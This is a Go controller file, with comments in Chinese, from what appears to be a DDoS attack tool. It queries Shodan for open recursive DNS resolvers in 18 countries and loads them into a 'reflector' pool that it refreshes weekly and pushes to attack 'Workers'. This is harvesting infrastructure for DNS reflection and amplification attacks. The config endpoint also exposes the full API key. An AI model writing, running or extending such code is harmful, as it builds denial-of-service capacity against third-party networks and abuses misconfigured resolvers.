package controller

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"newtool/internal/attack"
	"newtool/internal/reflector"
)

type shodanConfig struct {
	Key     string `json:"key"`
	Enabled bool   `json:"enabled"`
}

var shodanCountries = []string{
	"US", "CN", "RU", "DE", "JP", "BR",
	"IN", "GB", "FR", "KR", "CA", "AU",
	"NL", "IT", "SG", "HK", "PL", "VN",
}

const shodanConfigFile = "data/shodan_config.json"

func loadShodanConfig() shodanConfig {
	data, err := os.ReadFile(shodanConfigFile)
	if err != nil {
		return shodanConfig{}
	}
	var cfg shodanConfig
	json.Unmarshal(data, &cfg)
	return cfg
}

func saveShodanConfig(cfg shodanConfig) error {
	data, err := json.Marshal(cfg)
	if err != nil {
		return err
	}
	return os.WriteFile(shodanConfigFile, data, 0600)
}

type shodanMatch struct {
	IPStr string `json:"ip_str"`
	Port  int    `json:"port"`
}

type shodanSearchResp struct {
	Matches []shodanMatch `json:"matches"`
	Total   int           `json:"total"`
}

func queryShodanCountry(apiKey, country string, limit int) ([]string, error) {
	baseURL := "https://api.shodan.io/shodan/host/search"
	query := fmt.Sprintf("port:53 Recursion: enabled country:%s", country)

	var results []string
	page := 1
	maxPages := (limit + 99) / 100

	for page <= maxPages && len(results) < limit {
		reqURL := fmt.Sprintf("%s?key=%s&query=%s&page=%d",
			baseURL, url.QueryEscape(apiKey), url.QueryEscape(query), page)

		resp, err := http.Get(reqURL)
		if err != nil {
			return results, fmt.Errorf("http error: %w", err)
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode != 200 {
			return results, fmt.Errorf("shodan HTTP %d: %s", resp.StatusCode, string(body[:minInt(len(body), 200)]))
		}

		var sr shodanSearchResp
		if err := json.Unmarshal(body, &sr); err != nil {
			return results, fmt.Errorf("json error: %w", err)
		}

		if len(sr.Matches) == 0 {
			break
		}

		for _, m := range sr.Matches {
			if m.IPStr == "" || m.Port == 0 {
				continue
			}
			results = append(results, fmt.Sprintf("%s:%d", m.IPStr, m.Port))
		}

		page++
		time.Sleep(1 * time.Second)
	}

	if len(results) > limit {
		results = results[:limit]
	}
	return results, nil
}

func (c *Ctrl) cronShodanRefresh() {
	cfg := loadShodanConfig()
	if !cfg.Enabled || cfg.Key == "" {
		return
	}
	log.Printf("[shodan] auto-refresh every 7d, %d countries", len(shodanCountries))

	c.doSingleShodanRefresh(cfg.Key, shodanCountries)

	ticker := time.NewTicker(7 * 24 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		c.doSingleShodanRefresh(cfg.Key, shodanCountries)
	}
}

func (c *Ctrl) doSingleShodanRefresh(shodanKey string, countries []string) {
	pool := reflector.GetPool("dns")
	if pool == nil {
		log.Printf("[shodan] dns pool not found")
		return
	}

	// 记录同步任务开始
	syncID, err := reflector.LogShodanSync("manual", countries)
	if err != nil {
		log.Printf("[shodan] failed to log sync task: %v", err)
	}

	totalPulled := 0
	totalAdded := 0
	now := time.Now().Unix()

	// 候选池收集（不验证）
	var allCandidates []reflector.Candidate

	for _, country := range countries {
		log.Printf("[shodan] querying country=%s limit=2000 ...", country)
		targets, err := queryShodanCountry(shodanKey, country, 2000)
		if err != nil && strings.Contains(err.Error(), "Search cursor timed out") {
			// Shodan 分页游标超时会要求从 page 1 重启查询：自动重试一次
			log.Printf("[shodan] country=%s cursor timed out, restarting from page 1...", country)
			time.Sleep(2 * time.Second)
			targets, err = queryShodanCountry(shodanKey, country, 2000)
		}
		if err != nil {
			log.Printf("[shodan] country=%s error: %v", country, err)
			continue
		}
		if len(targets) == 0 {
			log.Printf("[shodan] country=%s: 0 results", country)
			continue
		}

		log.Printf("[shodan] country=%s: pulled %d raw targets", country, len(targets))
		totalPulled += len(targets)

		// 添加到候选池
		for _, t := range targets {
			ip, port := attack.SplitTarget(t)
			if port == 0 {
				port = 53
			}

			candidate := reflector.Candidate{
				IP:        ip,
				Port:      port,
				Game:      "dns",
				Country:   country,
				Continent: getContinent(country),
				Source:    "shodan",
				AddedAt:   now,
			}
			allCandidates = append(allCandidates, candidate)

			// 写入候选池数据库
			if err := reflector.AddCandidate(candidate); err != nil {
				log.Printf("[shodan] add candidate %s:%d error: %v", ip, port, err)
			}
		}
	}

	totalAdded = len(allCandidates)
	log.Printf("[shodan] refresh done: pulled=%d added_to_candidates=%d", totalPulled, totalAdded)

	// 更新同步日志
	if syncID > 0 {
		reflector.UpdateShodanSync(syncID, totalPulled, totalAdded, "completed")
	}

	// 广播池更新信号给所有 Worker
	c.broadcastPoolUpdate("dns", now)

	staleDeleted := cleanupStaleShodan(now - 7*86400)
	if staleDeleted > 0 {
		log.Printf("[shodan] removed %d stale shodan entries (>7d)", staleDeleted)
	}
}

// getContinent 根据国家代码返回大洲
func getContinent(country string) string {
	continentMap := map[string]string{
		"CN": "Asia", "JP": "Asia", "KR": "Asia", "SG": "Asia", "IN": "Asia",
		"HK": "Asia", "VN": "Asia", "TH": "Asia", "PH": "Asia", "ID": "Asia",
		"US": "Americas", "CA": "Americas", "BR": "Americas", "MX": "Americas",
		"AR": "Americas", "CL": "Americas", "CO": "Americas",
		"DE": "Europe", "GB": "Europe", "FR": "Europe", "NL": "Europe", "IT": "Europe",
		"RU": "Europe", "PL": "Europe", "ES": "Europe", "SE": "Europe", "CH": "Europe",
		"AU": "Oceania", "NZ": "Oceania",
	}
	if continent, ok := continentMap[country]; ok {
		return continent
	}
	return "Unknown"
}

func cleanupStaleShodan(beforeTime int64) int {
	d := reflector.GetDB()
	result, err := d.Exec("DELETE FROM reflectors WHERE source = 'shodan' AND last_seen_at > 0 AND last_seen_at < ?", beforeTime)
	if err != nil {
		return 0
	}
	n, _ := result.RowsAffected()
	return int(n)
}

func (c *Ctrl) handleShodanConfig(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		cfg := loadShodanConfig()
		masked := cfg.Key
		if len(masked) > 8 {
			masked = masked[:4] + "****" + masked[len(masked)-4:]
		}
		writeJSON(w, map[string]interface{}{
			"key":     cfg.Key,
			"enabled": cfg.Enabled,
			"masked":  masked,
		})

	case "PUT", "POST":
		var body shodanConfig
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, `{"error":"invalid json"}`, 400)
			return
		}
		if err := saveShodanConfig(body); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		log.Printf("[shodan] config updated: enabled=%v key_len=%d", body.Enabled, len(body.Key))
		writeJSON(w, map[string]interface{}{"ok": true})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

func (c *Ctrl) handleShodanRefresh(w http.ResponseWriter, r *http.Request) {
	cfg := loadShodanConfig()
	if cfg.Key == "" {
		writeJSON(w, map[string]string{"error": "no shodan key configured"})
		return
	}
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	var body struct {
		Countries []string `json:"countries"`
	}
	json.NewDecoder(r.Body).Decode(&body)

	countries := body.Countries
	if len(countries) == 0 {
		countries = shodanCountries
	}

	log.Printf("[shodan] manual refresh triggered: %d countries", len(countries))
	c.doSingleShodanRefresh(cfg.Key, countries)
	pool := reflector.GetPool("dns")
	count := 0
	if pool != nil {
		count = pool.Count()
	}
	writeJSON(w, map[string]interface{}{"ok": true, "total": count})
}

func (c *Ctrl) handleShodanCountries(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"countries": shodanCountries})
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
